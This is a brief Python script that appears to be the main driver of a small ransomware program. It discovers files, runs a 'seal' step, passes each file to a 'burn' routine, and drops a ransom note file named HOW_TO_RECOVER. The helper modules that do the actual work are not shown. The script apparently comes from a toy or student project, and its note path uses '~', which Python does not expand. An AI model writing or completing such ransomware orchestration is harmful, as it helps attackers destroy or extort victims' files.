import discover
import burn
import seal

archivos=discover.encuentra_archivos()
seal.main()

for item in archivos:
    burn.main(item)

with open("~/HOW_TO_RECOVER",'w') as file:
    file.write("RANSOM SC2-RANSOM SC2")
